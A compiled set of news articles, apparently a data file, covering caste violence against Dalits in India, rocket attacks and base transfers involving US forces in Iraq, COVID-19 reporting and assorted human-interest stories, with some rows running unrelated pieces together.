0,"While the local police have registered a complaint under the SC/ST Atrocities Act, a counter case has also been filed against Kashinath Talwar. A screenshot from a video of Kashinath Talwar being assaulted. New Delhi: A Dalit man was thrashed by a mob, allegedly as he had “touched” a two-wheeler vehicle of an upper caste man in Karnataka’s Vijayapura district. According to the New Indian Express, Kashinath Talwar, a 28-year-old daily wager was going to work with his father in Minajgi village in Vijayapura on Saturday. A group of villagers thrashed him, accusing him of merely touching a motorcycle that was owned by an upper-caste person, which was parked near Chennamma Circle, says the complaint filed by Talwar’s father Yankappa. A video that has surfaced on social media shows a crowd raining blows on the man, as others hold him. Yankappa stated that the crowd also assaulted him and his son’s wife and daughter when they tried to rescue Kashinath. “The men used offensive words against our caste and threatened to set our community houses on fire,” Talwar stated in his complaint, which has been registered at the Talikoti police station. The local police have registered a complaint under the SC/ST Atrocities Act, but no arrests have been made yet. Thirteen people had been named in the complaint, NDTV reported. A Karnataka police officer Anupam Aggarwal said that the villagers also filed a counter-FIR against Talwar. “When an investigation team reached the site of the incident today, they were told that he was beaten up when he took out his clothes and started showing his private parts to two girls who were washing clothes. We have registered a counter case under section 354 of the IPC,” he told NDTV. In several cases, counter-FIRs are filed by the police to force victims of caste atrocities to either back down or come to a compromise. Writing for NewsClick, Parth M.N. reported recently that in Beed town of Maharashtra, after a Dalit woman filed a complaint against a lawyer for physical and sexual abuse, a counter-FIR was registered against the victim within hours. The lawyer’s wife accused three men and the Dalit woman of attempting to gangrape her. The three men named in the FIR helped the Dalit woman file her complaint, one of them was a local journalist. “This counter FIR is to harass us for the help we extended to the woman,” the journalist said, according to the report. The Dalit woman said the lawyer, an ‘influential man’ in the town was offering to withdraw the complaint if she withdraws her’s. “I am being pressured,” she said. Recently, many incidents of violence against Dalits have been reported in the media. Last Friday, reports said a 27-year-old Dalit man was killed by six upper caste men in Gujarat. Pintu Galchar, a resident of Ravi village in Dhanera taluka of Banaskantha district was allegedly abducted from outside his house by a group of six men around 10 pm on July 16. He was later found dead, with his body showing gruesome injuries. In Madhya Pradesh’s Guna, a Dalit couple died by suicide after the police destroyed their crops as part of an ‘anti-encroachment’ drive. Visuals of the couple’s children holding their dead bodies and weeping were flashed on television screens across the country, causing outrage. In June, a report said that since the imposition of the coronavirus lockdown, caste atrocities had increased nearly fivefold in Tamil Nadu."
0,"The Discussion Map charts important debates from the pages of E​PW. M K Gandhi’s approach to issues of caste-based exploitation and subordination has been critiqued and scrutinised by theorists and practitioners over the years. This scrutiny involves, in many instances, contrasting Gandhi and B R Ambedkar’s approach to the question of Dalit emancipation. In 1996, Suhas Palshikar argued that while there are stark differences in the approach taken by Gandhi and Ambedkar, their shared goal of collective emancipation would require Gandhi to change his methodology. This is because, although Gandhi did not make caste-based inequality the centre of his struggles for emancipation, his views on the caste system reflected his “ultimate preparedness to abolish caste.” Anupama Rao responds to Palshikar and argues that the insight he provides into the beliefs and actions of the two thinkers reveals just how far apart their political methods and beliefs for emancipation were. A key differentiator was that Ambedkar’s understanding of caste was grounded in lived experiences of violence, while Gandhi’s knowledge of caste was that of an abstract concept. Palshikar responds to Rao, arguing that his article attempted to build bridges between two rich discourses. Specifically, he believes that both Gandhi and Ambedkar saw Indian society as being composed of non-fragmented identities. Rao responds to Palshikar again and argues that, given the histories of domination and subordination of caste categories, they must not be depoliticised. Rather, caste divisions must be recognised and worked through, in order to achieve any form of unity.

Students in tribal hamlets have urged the authorities to extend the registration window for the Save-a-Year (SAY)/improvement exam for the higher secondary exam held in March. The last date for submitting the application forms without fine was on Tuesday. Many students in tribal regions were finding it difficult to comply with the deadline in view of the short window for registration given by the Directorate of Higher Secondary Education amidst the pandemic crisis, according to Adishakthi Summer School, a collective that works for the upliftment of Adivasi students. ""As per the notification issued on August 20, students have to collect the applications for SAY exam from their schools. There are several students in tribal hamlets enrolled in schools outside their home district. How can these students travel all the way to their schools in other districts to complete the registration formalities within five days in this COVID-19 situation,"" asked Mary Lidiya, coordinator of Adishakthi Summer School. The students have to submit the filled-in forms to the Principal of their school. While the students need to collect and submit the application forms at their respective schools, the Principals have the option of registering them for the SAY examination online through the official portal of the Directorate of Higher Secondary Education, according to the notification. On the short span available for completing the registration formalities, the DHSE authorities pointed out that the candidates facing such difficulties could receive the application forms from their school Principals through messaging platforms. They could fill the details and return it to the Principals concerned, they said. The lack of internet connectivity remains a major hurdle for Adivasi students, who had returned to their hamlets following the outbreak of COVID-19. Those who had registered online for Plus One admission were directed to create log-in id and password as part of the admission process. Students said they were facing difficulties in receiving the one-time password owing to the lack of mobile connectivity in their hamlets.

0,"The U.S. handed over the al-Taqaddum Air Base to Iraqi forces on Saturday — it’s the fourth base to be handed over to Iraqi Security Forces over the last several weeks. The al-Taqaddum Air Base is located between Ramadi and Fallujah. The coalition says the base transfers are a result of success against ISIS. “These pre-planned base transfers are not related to recent attacks against Iraqi bases hosting Coalition troops, or the ongoing COVID-19 situation in Iraq,” Operation Inherent Resolve, said in a news release. The coalition has been consolidating troops across a number of smaller outposts to bigger bases. Some coalition troops have left Iraq as a result of COVID-19. The coalition has also been criticized for its inability to protect bases from rocket attacks believed to be orchestrated by Iran-backed militias. An attack on Camp Taji in March resulted in the deaths of two U.S. troops and one U.K. service member. “The transfer of Taqaddum (Habbaniya) air base is another step forward in the ongoing partnership between Iraqi Security Forces and the anti-ISIS international military Coalition,” Brig. Gen. Vincent Barker, OIR director of sustainment, said in a news release. “Over the last month we have transferred four bases to full ISF control. This wouldn’t be possible without the ISF’s proven capability to bring the fight to ISIS,"" Barker said in the release. The U.S. previously handed over al-Qaim, the Qayyarah West Airfield and the Kirkuk installation. Kirkuk was the scene of a deadly rocket attack in Dec. 2019 that killed an American contractor. The rocket attack carried out by an Iran-backed militia nearly sparked a war between Tehran and the U.S. The al-Taqqadum Air Base has hosted U.S. Marines, Italian, Canadian and Spanish forces, OIR said. Coalition advisers used the base to help Iraqi forces wrestle control of Ramadi and Fallujah from ISIS in 2016. “The Coalition will operate from fewer locations, but remains committed to supporting our partners in their fight against Daesh,” OIR said in the release. Coalition troops will depart al-Taqqadum in the coming days as equipment is transferred to Iraqi forces, OIR said. Shawn Snow is the senior reporter for Marine Corps Times and a Marine Corps veteran.

0,"The attack is the third targeting military bases hosting foreign forces in a week. Two rockets have struck a training base south of Baghdad where US-led coalition troops and NATO trainers are present, Iraq’s military has said. The attack, the third targeting military bases hosting foreign forces in a week, targeted the Besmaya base south of Baghdad on Monday night, read the statement, making no mention of casualties. Spanish forces linked to the US-led coalition fighting the Islamic State of Iraq and the Levant (ISIL or ISIS), as well as NATO training forces, are present in Besmaya. Earlier on Monday, US Secretary of State Mike Pompeo warned Iraq that the US would retaliate “as necessary” against any new assaults on Americans. Since late October, there have been 24 rocket attacks on the US embassy in Baghdad or bases where foreign troops are deployed, killing three American military personnel, one British soldier and one Iraqi soldier. No attacks have been claimed but Washington has blamed Kataeb Hezbollah, a hardline faction in the Hashd al-Shaabi (Popular Mobilisation Forces) state-sponsored military network. Iraq has long feared it would get caught in the spiralling tensions between Iran and the US, its two main allies.      Tensions between the two countries dramatically spiked in late 2019 when a US contractor was killed in a rocket attack on a separate base in northern Iraq, leading to retaliatory American strikes on Kataeb Hezbollah. Days later, a US drone strike killed Iranian commander Qasem Soleimani and Hashed deputy chief Abu Mahdi al-Muhandis. Iran launched ballistic missiles at US troops in Iraq while the Iraqi parliament voted to expel all foreign soldiers from its soil, a decision that has yet to be implemented. Some 5,200 American troops are based in Iraq as part of the US-led coalition. Top US military and civilian officials had long expressed frustration that Iraq‘s government was not doing enough to prevent rocket attacks targeting US troops and diplomats.

0,"BAGHDAD - Iraqi Prime Minister Adel Abdul Mahdi received word from Iran that its response to the U.S. killing of its top general was either imminent or under way, his spokesman said on Wednesday. Iranian forces fired missiles at military bases housing U.S. troops in Iraq in retaliation for the U.S. killing of the Iranian general, raising the stakes in its conflict with Washington amid concern of a wider war in the Middle East.

0,"By Lidia Kelly MELBOURNE (Reuters) - The Australian government said on Saturday it will allow the return of some Chinese high school students who have been blocked from entering the country due coronavirus restrictions, reopening the door to a market that is key for the economy. Thousands of Chinese students were prevented from heading to Australia after the long summer break for the start of school and university terms this month when the government imposed a travel ban for most people travelling from China. Australian officials said the targeted easing of the ban would allow about 760 Chinese high school students - none from Hubei province, which is the epicentre of the outbreak - to apply to return. The students would be considered on a case-by-case basis and those who were successful would be subjected to a 14-day self-imposed quarantine on arrival in Australia, officials said. ""It is incredibly important that we bring some normality back to the international student market,"" Education Minister Dan Tehan told reporters. ""It is a small step we are taking, it is a precautionary step."" Tehan said the government would next week consider whether to allow the return of tertiary education students. Chinese students made up almost 40% of the international higher education population in Australia in 2018, according to the most recent official data. That broader population has grown by more than 10% over each of the past three years, contributing more than A$30 billion (£15 billion) to the domestic economy. Australia introduced its travel restrictions on all foreign nationals who had been in China within two weeks of planned travel to Australia from entering the country. Australian nationals and permanent residents were exempted from the ban, which has been extended twice and remains in place until Feb. 29.

0,"In a spine-chilling video that has surfaced on Twitter, two Dalit men were beaten and tortured with a screwdriver by a group in Karnu village of Nagaur's Panchaudi area in Rajasthan. The incident happened a few days back on February 16 and the video has now gone viral on social media, evoking public outrage. The sickening video captures the brutality of a group of men who went on to mercilessly beat up and torture the two youths. Rajasthan police have arrested five people -- Hanuman Singh, Aidan Singh, Raghuvir Singh, Chhail Singh and Rehmatullah -- in connection with the case where the perpetrators pull off the pants of the victim, then douse a screwdriver with petrol and insert it in his rectum. While Hanuman is the owner, others are workers at the agency where the duo from the Dalit community allegedly tried to steal money from the cashbox at a motorcycle showroom, Nagaur superintendent of police (SP) Vikas Pathak said. READ | Horrific & sickening: Rahul Gandhi tweets, expresses shock over video More arrests to be made An FIR has been registered and the accused have been charged under sections 342 (for wrongful confinement), 323 (punishment for voluntarily causing hurt), 341 (punishment for wrongful restraint), 143 (unlawful assembly) of the Indian Penal Code and various sections of the SC/ST Act. Meanwhile, the police officer also said that some more arrests are expected today. The victims, identified as 25-year-old Bisa Ram and 18-year-old Panna Lal and are residents of Bhojas village, some 20 km away from Karnu where the violence took place. Reacting to the incident, lawyer and Dalit rights activist PL Mimroth said that it's shocking that violence of such nature continues to happen in independent India. ""What emboldens them to torture a Dalit person, record it and share the video? At times, it feels we are still living in medieval times,"" said Mimroth, the head of Centre for Dalit Rights, Jaipur. 'Horrific & sickening' Condemning the attack against Dalits in Rajasthan's Nagaur, former Congress President Rahul Gandhi took to Twitter urging the state government to take immediate action against the perpetrators. ""The recent video of two young Dalit men being brutally tortured in Nagaur, Rajasthan is horrific & sickening. I urge the state Government to take immediate action to bring the perpetrators of this shocking crime to justice,"" tweeted the Congress leader. (With agency inputs)"

First.,” meet more than 50 African American women who changed the world Nadine Daher Reporter While other children were making mud pies, Augusta Fells Savage used the clay near her home to mold small figures of farm animals. It was obvious that Savage had a talent for sculpting. Despite her father’s objections, and the opportunities she was denied because of her race, Savage continued to practice her craft and in 1934, became the first African American artist to be elected to the National Association of Women Painters and Sculptors. Savage’s work and spirit inspired many others to follow the trail she so bravely blazed. The walls of her studio in Harlem witnessed the early beginnings of several well-known artists like Jacob Lawrence and Gwendolyn Knight, where she offered free classes and gallery space to her students. This story is only one of many featured in, Brave. Black. First. 50+ African American Women Who Changed the World. A collection of short biographies written by Cheryl Willis Hudson, and compiled in collaboration with the Smithsonian’s National Museum of African American History and Culture, the book’s pages serve as testament to the impact women, and particularly women of color, have had and continue to have on the world. Although created for young readers, the masterful storytelling combined with Erin K. Robinson’s enchanting illustrations are sure to capture the attention of all generations. Kinshasha Holman Conwill, the museum’s deputy director, who lent her expertise to the selection process, hopes that the compendium incentivizes readers to take the next step, and perhaps be inspired to listen to the music of Nina Simone or to tackle Michelle Obama’s memoir Becoming. “This book might strike a chord, it might make those who read it want to go further, and increase their knowledge,” says Conwill. Flipping the pages, one is struck by the authenticity and vibrancy of the illustrations. The pearls around Ella Fitzgerald’s neck glisten, the tennis ball flies from Serena Williams’ racket, the purple of Dorothy Height’s hat pulses with pride and Angela Davis’ fist is clenched in fierce defiance. “I really wanted my illustrations to feel tangible, to be textured and have emotion,” says Robinson. “I want the readers to feel that they knew these women, to feel intimate with them.” The narratives span a vast range of cultural landscapes. From music and sports to arts and activism, from protest to performance, each story hints at the many different methods and means that women access to find success, but when read as a whole, the tales reveal the profound commonality these women share. They are all brave, they are all black, and they are all the first to achieve groundbreaking success in their respective fields. Through its collaboration with the museum, the book works to pull these women from the pages and into real life. Many of the women featured are linked to artifacts held in the museum’s collections, which Hudson anticipates will demonstrate to the readers that history is prologue. “I think children, young adults, adults, people can see themselves as a part of history, rather than something that is stiff and, on the page,” explains Hudson. “I hope that children can go into the museum, and experience the history they read about in the book.” Conwill, emphasizes this sentiment, hoping the book is another method for sharing the museum’s vast collections. “Like the motto of the Smithsonian—the increase and diffusion of knowledge—it makes people want to not only take this for what it is, but to move beyond it,” she says. Published in collaboration with the Smithsonian's National Museum of African American History and Culture, discover more than 50 remarkable African American women whose unique skills and contributions paved the way for the next generation of young people. These 100 stunning postcards celebrate 50 groundbreaking African American women, from Harriet Tubman and Rosa Parks to Angela Davis and Beyoncé—published in collaboration with the Smithsonian's National Museum of African American History and Culture.

0,"Chaldean Catholic archbishop Paulos Faraj Rahho Follow @TIME Pope Benedict XVI has repeatedly worried out loud about the fate of Christian minorities in the Islamic world. He's complained that churches can't be built in many Muslim countries. He warned of a mass exodus of his ancient Catholic flock from places like Beirut and Bethlehem. Now, the Pope has a martyred Iraqi bishop to lament. Chaldean Catholic Archbishop of Mosul, Paulos Faraj Rahho was kidnapped on Feb. 29. On Thursday, his body was recovered. Almost immediately, the Pontiff released a blunt statement, declaring: ""the most resolute condemnation of an act of inhuman violence that offends the dignity of the human being."" Several Catholic priests and seminarians have been killed in previous attacks and kidnappings over the past three years in Iraq, but Rahho is the first bishop to perish after being caught up in that country's cycle of violence. The body of the bearded 65-year-old, who was known to be in poor health, was found after his abductors called Rahho's church to say that he'd died and been buried. His corpse was found in a shallow grave just outside Mosul. The cause of death was not immediately clear. Still, there is little doubt about the religious motivation of last month's brazen abduction, in which Rahho's driver and two bodyguards were slain. Even if criminal elements were involved in the kidnapping  and ransoms were reportedly sought  the victim was clearly targeted for his prominent role in the Church. Mosul is the capital of Ninevah Province and home to most of Iraq's Assyrian Christian community, which swears allegiance to the Pope in Rome. Iraqi Christians have faced difficult circumstances since the U.S. invasion in 2003. Viewed by jihadist insurgents as natural allies of the American ""crusaders,"" Christians were subjected to threats and a wave of church bombings early in the war. They faced similar violence from Shi'ite militias enforcing a strict interpretation of Islamic law. Some liquor stores  which are mostly Christian-owned since Islam forbids drinking alcohol  were bombed; many others closed or went underground. The strain on Iraq's Christians was evident last Christmas at the Assyrian Catholic Church in the Karrada neighborhood of Baghdad. The previous year, Christmas 2006, Baghdad was wracked by violence and mass was poorly attended. Security improved dramatically at the end of last year, and Christmas drew a crowd that overflowed the pews and left worshippers standing in the back of the church. But it is still a community under siege. Leila Najib, who attended mass with her husband and children, said that many of her fellow worshippers had recently moved to Karrada from other parts of Baghdad. Karrada is one of the last neighborhoods in Baghdad with a significant Christian population. Christians in Baghdad neighborhoods like Dora have fled to Karrada, and may never return to their former homes. Even amid the relative peace brought by the U.S. military surge, Iraq's Christians still do not feel they can turn to the government for protection, or to safeguard their way of life. They fear that the Shi'ite-dominated government will only strengthen the hand of conservative Muslim groups hostile to Christians. ""Security is a little better  not great,"" said Najib. Catholic leaders in Rome and Iraq have decried what they see as a systematic attempt by radical Islamic groups to drive out Christians from Iraq, where their ancestry can be traced to the very origins of the faith. ""The persecution of Christians in Iraq has been intensifying for the past two years,"" said Roberto Fontolan, the Rome-based editor of Oasis, a Catholic publication focused on the plight of Christians in Muslim-majority countries. ""After all the alarms and condemnations, we have yet another tragic turn."" Oasis reported recently that as many as 350,000 of the 800,000 Christians in Iraq before the war have since fled the country. In Baghdad, Najib, like many of her fellow worshippers, said that even improved security would not tempt the many Christians who have fled the countryto come home. Several Christians at mass that day said they were planning their own departures from Iraq. ""Nobody,"" Najib said, ""will come back."" Relations with Muslims have become a central theme under Benedict's papacy. His provocative 2006 speech in Germany about faith and reason sparked widespread protest in the Muslim world. Still, clumsy as it may have been, the attempt by the theologically-driven Pope to sharpen the debate about religious roots of violence seems to be bearing some fruit. A back-and-forth between prominent Muslim and Christian clerics has begun, including a letter last year from 138 prominent Islamic scholars offering to step up dialogue. Last month, Vatican officials announced that they would host the first in a series of high-level meetings with Muslims next November, where the Pope will appear. Under John Paul II, the Vatican had been somewhat more careful in its approach to the Muslim world, often accepting limited worshipping rights in exchange for security assurances. Benedict instead has pushed repeatedly for ""reciprocity,"" that is to demand that the same religious freedoms that Muslims enjoy in the West be granted for Christians in Muslim dominated countries. But Fontolan said, despite the signs of progress among the theologians, there is little concrete evidence ""on the ground"" of progress from the ruling authorities. ""On religious liberty, I don't see any steps forward,"" he said. ""We try and retry."" As extremists have gained prominence and power in the Muslim world since Sept. 11 and the onset of the Iraq war, pressure has increased on those forces hoping to guarantee basic rights and security of minority faiths. Catholic Church officials had long looked to Lebanon as a potential model for religious diversity in the Arab world. But, says Fontolan, ""I don't see much hope there now either."" Lebanon has recently been wracked by sectarian conflict among its Christian, Druze and Sunni and Shi'a Muslim citizens. The Pope no doubt will mourn his martyred bishop at Sunday's Angelus prayer in St. Peter's Square. And next month, there is another appointment on his schedule where he may very well worry out loud about Christians in the Middle East: his visit to the White House and President George Bush, the man who brought about the Iraq war.

0,"A 16-year-old boy is paralyzed after a car accident Friday in Reno County, according to the family. Deputies say a small pickup truck was traveling westbound on east 4th Avenue when the driver lost control on slick roads and veered into a ditch. The pickup then rolled several times. Raiden Stewart was trapped inside. Hutchinson firefighters extracted Raiden from the pickup, and he was taken to Wesley Medical Center for treatment. His mother, Tara Stewart, says her son Raiden had surgery Saturday. She says he is paralyzed from the chest down and has limited arm movement. He fractured his spinal cord and will most likely not be able to walk again. He also has damage to his vertebral artery. Stewart says her son is a Buhler High School junior who is part of the wrestling and football team. He just took first place at the Douglas Varsity Wrestling Tournament and recently took second place at the Abilene Varsity Wrestling Tournament. Raiden's coaches say he inspired people on the football field and on the wrestling. While the prognosis is difficult, they say Raiden is already making strides in his recovery. ""His mental toughness will probably help carry him along as well. Not just his physical strength,"" said Buhler wrestling coach, Mike Zeyen. ""He has a big heart,"" said Buhler High School head football coach, Steve Warner. ""He knows he can handle it and he's going to fight."" Warner said a lot of students have traveled to see Raiden and his family. His mom is asking for thoughts and prayers in this difficult time. After he is released from the hospital, Raiden will go to a spinal rehabilitation center in either Denver or Omaha. Family and friends have set up a to help with expenses. There is also a fundraiser, set for Tuesday (Jan. 21) from 5 p.m. to 8 p.m. at the Spangles located at 120 east 4th Avenue (Hutchinson). Some of the proceeds will be given to the family."

0,"The Iraqi parliament called on the government on Sunday to work to end all foreign troop presence as a backlash grew after the killing of a top Iranian military commander and an Iraqi militia leader in a US strike in Baghdad. A resolution passed by a special session of parliament said the government should cancel its request for assistance from a US-led coalition. Parliament resolutions, unlike laws, are non-binding to the government. But this one is likely to be heeded: Prime Minister Adel Abdul Mahdi had earlier called on parliament to end foreign troop presence as soon as possible. ""Despite the internal and external difficulties that we might face, it remains best for Iraq on principle and practically,"" Abdul Mahdi said. The special session was called after a US drone strike on Friday on a convoy at Baghdad airport that killed Iranian military commander Qassem Soleimani and Iraqi militia leader Abu Mahdi al-Muhandis. Since the killings, rival Shi'ite political leaders have called for US troops to be expelled from Iraq in an unusual show of unity among factions that have squabbled for months. ""There is no need for the presence of American forces after defeating Daesh (Islamic State),"" said Ammar al-Shibli, a Shi'ite lawmaker and member of the parliamentary legal committee, before the parliamentary meeting. ""We have our own armed forces which are capable of protecting the country,"" he told Reuters. Despite decades of enmity between Iran and the United States, Iran-backed militia and U.S. troops fought side by side during Iraq's 2014-2017 war against Islamic State militants. Around 5,000 US troops remain in Iraq, most of them in an advisory capacity. Abdul Mahdi, who holds the post in a caretaker role after resigning in November amid street protests, called on Friday for parliament to convene the extraordinary session to take legislative steps to protect Iraq's sovereignty. Hadi al-Amiri, the top candidate to succeed Muhandis, repeated his call for U.S. troops to leave Iraq on Saturday during a funeral procession for those killed in the attack. Many Iraqis, including opponents of Soleimani, have expressed anger at Washington for killing him and Muhandis on Iraqi soil and potentially dragging their country into another conflict. বাংলাদেশে তৃতীয় শ্রেণিতে অধ্যয়নরত শিশুদের মাত্র ৩৪ শতাংশের পড়তে পারে। এই শ্রেণির শিক্ষার্থীদের মধ্যে মাত্র ১৮ শতাংশের গুণতে পারার প্রাথমিক দক্ষতা আছে। এক্ষেত্রে সুবিধাবঞ্চিত শিশুদের অবস্থা আরও খারাপ।"

And African Americans now represent 57% of all COVID-19 deaths in Chicago. In just the last two-weeks, the number of black victims has tripled. CBS 2 Investigator Dorothy Tucker first identified five hot spots using maps CBS 2 created. Now, she's digging deeper into the data and found in the neighborhoods where the victims lived, many have essential jobs that increase their chances of being exposed to the deadly virus. Look no further than the blue points on the map. These are people who died of coronavirus. Most of them live in Chicago's black communities, the hot spots for COVID-19 deaths. When CBS 2 first took a look two weeks ago, five neighborhoods had the worse deaths: South Shore, Englewood, Auburn Gresham, Austin and Chatham. It was bad then. It is worse now. Englewood is leading the way. The numbers of deaths have jumped from six to 23 as of last Friday. South Shore is almost as bad: seven deaths two weeks ago. By the weekend 22. Auburn Gresham, Chatham and Austin neighborhoods, all identified as hot spots, have also seen increases. A common thread among those who died: where they work. ""When we consider the types of positions that black Americans hold, many of them are on the front lines in essential roles related to food delivery, groceries work, transportation, delivery,"" said epidemiologist Dr. Mercedes Carnethon of Northwestern Medicine. The data CBS 2 pulled reflects the reality. In Austin, where 19 people died, nearly 11% of those employed work in transportation. That's nearly 3,500 people. In Englewood, nearly 12% of those employed, or just over 2,000 people, also work transportation jobs. Another 1,200 work in food preparation. Consider the case of young adult working: A 30 to 40 years old grocery store worker. ""He or she does not have symptoms but they're talking, they are providing care for younger children, they are providing care for elders. There is no amount of cleaning within a household that can stop the spread through ordinary interactions and discussions,"" Carnethon said. MAP: The Most Covid Deaths In Chicago Happened In These Neighborhoods Another popular job in those black communities: people who work in health care as kitchen helpers or janitors.

0,"Zion, an African penguin chick, was born at Audubon Aquarium of the Americas on Feb. 17, 2020.  Staff writer Zion, an African penguin chick, was born at Audubon Aquarium of the Americas on Feb. 17, 2020. The Audubon Aquarium of the Americas introduced a special new addition Tuesday via Facebook Live — a month-old African penguin chick named Zion. Audubon staff named the penguin after New Orleans Pelicans power forward Zion Williamson, who recently made headlines when he announced March 13 that he'd cover the salaries of Smoothie King Center workers for 30 days after NBA games were put on hold. The penguin chick was born on Feb. 17 after his egg was incubated for 39 days. His mother Hubig and father Ocio raised him for the first 11 days, but after that he needed human care, an intensive process in which he'll be fed and looked after for two months before he begins to be introduced to the rest of the aquarium's penguins.  African penguins are part of the Association of Zoos and Aquariums' Species Survival Plan, an effort to oversee the management of the species in captivity while also helping with its conservation in the wild. The species had 141,000 breeding pairs in 1956 and now only has around 25,000, due to habitat destruction, overfishing and oil spills. The Facebook Live video was part of the Audubon Nature Institute's new daily social media livestreams, which it announced it would do last week after its facilities closed to the public due to coronavirus. Audubon and the Pelicans have an ongoing partnership. The NBA team sponsors a wetlands exhibit at the Audubon Zoo called Pelicans' Nest. Residents can adopt one of the aquarium's African penguins by donating money to help fund their care.  Daily livestreaming sessions include interactive videos, virtual tours of facilities online quizzes and more.

Reuters reported that eight rockets were launched at the Balad joint airbase, which sits around 50 miles north of Baghdad. A statement from the Iraqi military on the injuries did not identify who was behind the attack, according to the outlet. The attack comes just days after two military bases in Iraq that house US forces were targeted by Iran as tensions between the countries escalated following the killing of Gen. Qassem Soleimani. Visit Business Insider's homepage for more stories. At least four Iraqi soldiers were wounded on Sunday in a rocket attack on the Balad airbase in northern Iraq, according to Reuters. The outlet reported that the Iraqi military said in a statement that the base, which also houses US personnel, was targeted by eight Katyusha rockets that were fired from about 50 miles (80 km) north of Baghdad. According to the report, seven of those rockets hit the base's runway. No casualties among the US forces were reported, according to Reuters, and the military statement did not identify who was behind the attack. The injuries come just days after an attack on two military bases in Iraq that house US forces that were launched by Iran as tensions between the countries escalated following the killing of Gen. Qassem Soleimani, the high-profile head of Iran's elite Quds Force of the Islamic Revolutionary Guard Corps, in an airstrike on January 2 at Baghdad's international airport in accordance with orders from President Donald Trump. The strike immediately triggered security concerns for US entities in the region as Iranian supreme leader Ayatollah Ali Khamenei, who said that a ""harsh retaliation is waiting"" for Americans. The Pentagon said in a statement after it completed the fatal airstrike that it had targeted Soleimani because he ""was actively developing plans to attack American diplomats and service members in Iraq and throughout the region,"" as the White House emphasized that the strike was ordered as a measure to increase security and peace.

Additional Superintendent of Police (City) Jaunpur, Sanjay Kumar, said a reward of ₹5,000 each had been announced on the 17 persons absconding after the incident. “All the accused barring 17 were arrested,” said Mr. Kumar. Police had arrested 37 persons in connection with the incident in which seven huts of a Dalit community were set ablaze and some cattle heads were also burnt to death late last Tuesday at Bhadethi village in the Sarai Khawaja area of the Purvanchal district. Uttar Pradesh Chief Minister Yogi Adityanath on Thursday ordered officials to lodge the National Security Act (NSA) against the accused. The incident started out after a minor dispute between two sets of youths who had accompanied their grazing buffaloes and goats near a pond. While local sources said the dispute started over the plucking of mangoes, the Station House Officer said the altercation broke out after a buffalo belonging to youths of one community attacked a goat on the other side. Following a scuffle between the youths, a compromise was reached at the behest of the local pradhan, said the police.

0,"New Delhi: Union Home Minister Amit Shah on Wednesday announced that the Shri Ram Janmabhoomi Teertha Kshetra, set up by the government for construction of a temple in Ayodhya, will have 15 trustees and one of them will be from the Dalit community. The home minister's statement comes a little over an hour after Prime Minister Narendra Modi announced in Lok Sabha about the constitution of the trust. ""There will be 15 trustees in the Shri Ram Janmabhoomi Teertha Kshetra Trust out of which one trustee will always be from the Dalit society,"" he tweeted. Shah congratulated Modi ""for such an unprecedented decision"" that strengthens social harmony. The home minister said the trust will be independent to take every decision related to the temple and 67 acres of land will be transferred to it. ""I fully believe that the waiting of millions of people for centuries will be over soon and they will be able to pay obeisance to Lord Shri Ram in his grand temple at his birthplace,"" he said. Shah thanked the prime minister for his commitment for construction of a temple dedicated to Lord Ram, ""who is a symbol of faith and unwavering reverence of India"". ""Today is a day of immense joy and pride for the whole country,"" he said in another tweet. He said as per the Supreme Court order on the Ram Janmabhoomi issue, the central government has taken a historic decision to form a trust in the name of Lord Ram, showing its commitment towards the construction of the grand temple in Ayodhya. While making the announcement for the trust in Lok Sabha, the Prime Minister said the Union Cabinet also decided to transfer 67.703 acre land to the trust. The Uttar Pradesh government has agreed to give five acres of land to the UP Sunni Wakf Board as directed by the Supreme Court in the Ayodhya matter, Modi said. UP government spokesperson Shrikant Sharma said the land is in Dhannipur village in Ayodhya on the Lucknow highway, about 18 kilometres from the district headquarters. While delivering the judgement on November 9, the Supreme Court had said the trust should be formed within three months for the construction of the temple at the site where many Hindus believe Lord Ram was born.

The new assessment indicates it is more likely that the virus originated in a Chinese market. “It is highly likely it was naturally occurring and that the human infection was from natural human and animal interaction,” an official associated with the Intelligence told CNN. (adsbygoogle = window.adsbygoogle || []).push({}); The Five Eyes alliance shares a broad range of intelligence with one another — in one of the world’s tightest multilateral arrangements. Trump and Pompeo, in recent days, have doubled down on the assertion that the outbreak originated from a accident at a laboratory in Wuhan, rather than a market in the same region. Hence, this new assessment now stands to increase pressure on the Trump administration to provide evidence to back up its claim, which it has failed to do so far despite the increasingly aggressive rhetoric. The source said that “clearly the market is where it exploded from,” but how the virus got to the market remains unclear. (adsbygoogle = window.adsbygoogle || []).push({}); Earlier, in an interview with National Geographic, Dr Anthony Fauci, the nation’s top infectious disease expert, had also said he didn’t believe the virus originated in a lab. “This could not have been artificially or deliberately manipulated,” Fauci said, adding that he doesn’t believe that the virus somehow escaped a lab into society. To this end, the US intelligence community issued a statement on Thursday saying it was working to “determine whether the outbreak began through contact with infected animals or if it was the result of an accident at a laboratory in Wuhan.” The statement said that coronavirus was not manmade or genetically modified. Meanwhile, a nationalist tabloid controlled by the Chinese Communist Party dismissed claims by the Trump administration that the novel coronavirus originated from a laboratory, as the war of words over the pandemic escalated between Washington and Beijing. China’s state-owned Global Times newspaper said in an editorial that the US had “stunned the world with groundless accusations.” Scientists around the world have also condemned conspiracy theories. China has faced criticism at home and abroad over its handling of the virus, especially during the initial outbreak. It was accused of silencing whistleblowers and delaying informing the public about the severity of the crisis.

0,"Two days after Kutch-based Dalit activist-cum-lawyer, Devji Maheshwari, was murdered allegedly by a Mumbai-based man over his alleged “anti-Brahmin” posts on social media, police detained five more accused in the case on Sunday. So far, six accused, including Bharat Raval, a resident of Malad West in Mumbai and native of Rapar, have been detained in the case even as a Special Investigation Team (SIT) comprising seven senior police officers of Kutch Range was formed on Sunday to investigate the case. Fifty-year-old Maheshwari was murdered on Friday evening in Rapar of Kutch Gandhidham, allegedly by Raval, who is seen in the CCTV footage following the victim inside a building in Rapar town. Nine were booked in the murder case following a complaint by the victim’s wife, Minaxiben Maheshwari. Mayur Patil, superintendent of police, Kutch Gandhidham, told The Indian Express, “The main accused was held from Mumbai on Saturday and we detained five more accused today (Sunday). We are yet to corroborate with the main accused regarding the role of the remaining accused in the murder and legal proceedings such as Covid test of the detainees are going on… An SIT, which will be overseen by the Inspector General of Kutch Range, with seven senior officers, including me, has also been formed.” Also Read| Accused could not tolerate anyone insulting Hindus, Brahmins, says former employer On Saturday, Raval was held by a team of Mumbai Crime Branch and was handed over to the Gujarat Police for further investigation. According to police, Maheshwari was killed by Raval, a Brahmin, who objected to the social media posts made by the victim, critical of Brahminism. The last post on Maheshwari’s Facebook post was a video of All India Backward and Minority Communities Employees Federation (BAMCEF) national president Waman Meshram saying that members of Scheduled Castes, Scheduled Tribes and Other 